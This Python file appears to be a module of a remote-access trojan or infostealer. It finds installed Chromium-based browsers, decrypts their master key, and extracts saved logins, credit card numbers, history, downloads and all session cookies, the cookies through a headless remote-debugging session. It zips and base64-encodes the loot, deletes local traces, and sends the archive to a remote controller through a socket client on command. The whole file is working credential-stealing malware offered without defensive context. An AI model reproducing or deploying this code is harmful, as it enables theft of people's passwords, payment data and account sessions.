import base64
import json
import os
import shutil
import sqlite3
import subprocess
import time
import getpass
import signal
import requests
import websocket
from datetime import datetime, timedelta
from Crypto.Cipher import AES
from win32crypt import CryptUnprotectData
import zipfile
import random
import string
from typing import Tuple, Dict, Any, List


appdata = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')

browsers = {
    'chrome': appdata + '\\Google\\Chrome\\User Data',
    'avast': appdata + '\\AVAST Software\\Browser\\User Data',
    'torch': appdata + '\\Torch\\User Data',
    'vivaldi': appdata + '\\Vivaldi\\User Data',
    'chromium': appdata + '\\Chromium\\User Data',
    'chrome-canary': appdata + '\\Google\\Chrome SxS\\User Data',
    'msedge': appdata + '\\Microsoft\\Edge\\User Data',
    'msedge-canary': appdata + '\\Microsoft\\Edge SxS\\User Data',
    'msedge-beta': appdata + '\\Microsoft\\Edge Beta\\User Data',
    'msedge-dev': appdata + '\\Microsoft\\Edge Dev\\User Data',
    'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
    'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
    'opera': roaming + '\\Opera Software\\Opera Stable',
    'opera-gx': roaming + '\\Opera Software\\Opera GX Stable'
}

data_queries = {
    'login_data': {
        'query': 'SELECT action_url, username_value, password_value FROM logins',
        'file': '\\Login Data',
        'columns': ['URL', 'Email', 'Password'],
        'decrypt': True
    },
    'credit_cards': {
        'query': 'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards',
        'file': '\\Web Data',
        'columns': ['Name On Card', 'Card Number', 'Expires On', 'Added On'],
        'decrypt': True
    },
    'history': {
        'query': 'SELECT url, title, last_visit_time FROM urls',
        'file': '\\History',
        'columns': ['URL', 'Title', 'Visited Time'],
        'decrypt': False
    },
    'downloads': {
        'query': 'SELECT tab_url, target_path FROM downloads',
        'file': '\\History',
        'columns': ['Download URL', 'Local Path'],
        'decrypt': False
    }
}


def get_master_key(path):
    try:
        local_state_path = os.path.join(path, "Local State")
        if not os.path.exists(local_state_path):
            return None

        with open(local_state_path, "r", encoding="utf-8") as f:
            local_state = json.load(f)

        key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        return CryptUnprotectData(key[5:], None, None, None, 0)[1]
    except Exception as e:
        return None


def decrypt_password(buff, key):
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        return cipher.decrypt(payload)[:-16].decode()
    except Exception:
        return ""


def save_results(temp_folder, browser_name, type_of_data, content):
    try:
        if content:
            browser_folder = os.path.join(temp_folder, browser_name)
            os.makedirs(browser_folder, exist_ok=True)

            with open(f'{browser_folder}/{type_of_data}.txt', 'w', encoding="utf-8") as file:
                file.write(content)
    except Exception:
        pass


def get_data(path, profile, key, type_of_data):
    db_file = f'{path}\\{profile}{type_of_data["file"]}'
    if not os.path.exists(db_file):
        return ""

    result = ""
    try:
        shutil.copy(db_file, 'temp_db')
        conn = sqlite3.connect('temp_db')
        cursor = conn.cursor()
        cursor.execute(type_of_data['query'])

        for row in cursor.fetchall():
            row = list(row)
            if type_of_data['decrypt']:
                for i in range(len(row)):
                    if isinstance(row[i], bytes) and row[i]:
                        row[i] = decrypt_password(row[i], key)
            if type_of_data["query"] == 'SELECT url, title, last_visit_time FROM urls' and row[2] != 0:
                row[2] = convert_chrome_time(row[2])
            result += "\n".join([f"{col}: {val}" for col, val in zip(type_of_data['columns'], row)]) + "\n\n"

        conn.close()
        os.remove('temp_db')
    except Exception:
        pass
    return result


def convert_chrome_time(chrome_time):
    try:
        return (datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)).strftime('%d/%m/%Y %H:%M:%S')
    except Exception:
        return "Unknown"


def installed_browsers():
    available = []
    not_available = []
    try:
        for browser, path in browsers.items():
            if os.path.exists(os.path.join(path, "Local State")):
                available.append(browser)
            else:
                not_available.append(browser)
    except Exception:
        pass
    return available, not_available


def extract_cookies(browser_name: str) -> Dict[str, Any]:
    def get_paths(browser_name: str) -> Tuple[List[str], str]:
        browser_executables = {
            'chrome': 'chrome.exe',
            'msedge': 'msedge.exe',
            'opera': 'opera.exe',
            'brave': 'brave.exe',
            'vivaldi': 'vivaldi.exe',
            'torch': 'torch.exe',
            'yandex': 'browser.exe',
            'opera-gx': 'opera.exe',
        }

        if browser_name not in browser_executables:
            return [], ''

        executable_name = browser_executables[browser_name]
        paths = []

        try:
            result = subprocess.run(
                ['where', '/r', 'C:\\', executable_name],
                capture_output=True, text=True, check=True
            )
            paths = [path.strip() for path in result.stdout.strip().split("\n") if path.strip()]
        except subprocess.CalledProcessError as e:
            return [], ''

        user_data_dir = browsers.get(browser_name, '')
        return paths, user_data_dir

    def run_browser_cmd(browser_executable: str, user_data_dir: str) -> subprocess.Popen:
        try:
            browser_cmd = (
                f'{browser_executable} --user-data-dir="{user_data_dir}" https://www.google.com --headless --remote-debugging-port=9222 --remote-allow-origins=*'
            )
            process = subprocess.Popen(browser_cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            time.sleep(6)
            return process
        except Exception as e:
            return None

    def get_cookies() -> Dict[str, Any]:
        try:
            websocket_url = requests.get('http://localhost:9222/json').json()[0].get('webSocketDebuggerUrl')
            ws = websocket.create_connection(websocket_url)
            ws.send(json.dumps({'id': 1, 'method': 'Network.getAllCookies'}))
            result = ws.recv()
            ws.close()
            return json.loads(result)['result']['cookies']
        except Exception:
            return {}

    def kill_browser_process_by_pid(browser_proc: subprocess.Popen):
        try:
            os.kill(browser_proc.pid, signal.SIGTERM)
        except:
            pass

    all_cookies = {}

    try:
        browser_executables, user_data_dir = get_paths(browser_name)
        
        if not browser_executables or not user_data_dir:
            return {}

        for browser_executable in browser_executables:
            browser_process = run_browser_cmd(f'"{browser_executable}"', user_data_dir)

            if not browser_process:
                continue

            try:
                cookies = get_cookies()
                if cookies:
                    all_cookies[browser_executable] = cookies
            finally:
                kill_browser_process_by_pid(browser_process)

        return all_cookies
    except Exception as e:
        return {}

def random_string(length=8):
    try:
        return ''.join(random.choices(string.ascii_letters + string.digits, k=length))
    except Exception:
        return "temp"

def get_browser_data():
    temp_folder = os.path.join(os.getenv('TEMP'), random_string())
    try:
        os.makedirs(temp_folder, exist_ok=True)
    except Exception:
        return None

    available_browsers, _ = installed_browsers()

    for browser in available_browsers:
        try:
            browser_path = browsers[browser]
            master_key = get_master_key(browser_path)
            
            for data_type_name, data_type in data_queries.items():
                data = get_data(browser_path, "Default", master_key, data_type)
                save_results(temp_folder, browser, data_type_name, data)

            cookies = extract_cookies(browser)
            save_results(temp_folder, browser, 'cookies', str(cookies))
        except Exception:
            continue

    zip_name = f'{temp_folder}.zip'

    try:
        with zipfile.ZipFile(zip_name, 'w', zipfile.ZIP_DEFLATED) as zipf:
            for root, _, files in os.walk(temp_folder):
                for file in files:
                    zipf.write(os.path.join(root, file), os.path.relpath(os.path.join(root, file), temp_folder))

        with open(zip_name, 'rb') as zip_file:
            encoded_zip = base64.b64encode(zip_file.read()).decode('utf-8')

        os.remove(zip_name)
        shutil.rmtree(temp_folder)
    except Exception:
        return None

    return encoded_zip


def retrieve_browsers(client, data, converter):
    try:
        command = data["browsers"]

        if command == "installed_browsers":
            available_browsers, not_available_browsers = installed_browsers()
            data = f"Installed: {', '.join(available_browsers)}" if available_browsers else f"Not Installed: {', '.join(not_available_browsers)}"
            client.emit('message', converter.encode({"browsers": data}))

        elif command == "browsers_data":
            encoded_zip = get_browser_data()
            if encoded_zip:
                client.emit('message', converter.encode({"browsers_data": encoded_zip}))
            else:
                client.emit('message', converter.encode({"browsers_logger": "Error retrieving browser data"}))

    except Exception as e:
        client.emit('message', converter.encode({"browsers_logger": str(e)}))